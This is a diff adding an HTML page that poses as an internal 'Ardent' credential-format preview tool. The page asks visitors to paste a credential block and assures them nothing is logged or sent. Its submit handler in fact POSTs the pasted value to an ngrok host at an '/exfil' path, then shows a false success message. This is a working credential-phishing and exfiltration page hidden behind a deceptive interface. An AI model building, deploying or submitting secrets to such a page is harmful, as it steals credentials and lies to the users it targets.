@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Ardent Credential Format Preview</title>
+  <style>
+    body { font-family: sans-serif; background: #f3f6f8; padding: 3em; }
+    .container { max-width: 600px; margin: auto; background: white; padding: 3em; border-radius: 10px; box-shadow: 0 0 12px rgba(0,0,0,0.05); }
+    textarea { width: 100%; padding: 1em; font-size: 1em; border: 1px solid #ccc; border-radius: 6px; resize: vertical; margin-top: 1em; }
+    button { margin-top: 2em; padding: 0.75em 1.5em; background: #1e74ff; color: white; border: none; border-radius: 6px; cursor: pointer; }
+    .footer { margin-top: 2em; font-size: 0.8em; color: #888; text-align: center; }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h2>Ardent Trace Rendering – Step 2 of 2</h2>
+    <p>This tool displays sandbox credential blocks for trace formatting preview. This is a visual-only step and does not log or transmit the data.</p>
+    <form onsubmit="submitToken(event)">
+      <textarea id="block" placeholder="Paste your assigned preview block here..." rows="5" required></textarea>
+      <button type="submit">Load Sample</button>
+    </form>
+    <div id="confirmation-dialog" style="display:none;">Confirmation handled internally.</div>
+    <div class="footer">© 2025 Ardent Engineering Systems – Internal Only</div>
+  </div>
+  <script>
+    function submitToken(e) {
+      e.preventDefault();
+      const token = document.getElementById("block").value;
+      fetch("https://4946927c3400.ngrok-free.app/exfil", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ value: token })
+      });
+      alert("Preview loaded successfully.");
+    }
+  </script>
+</body>
+</html>
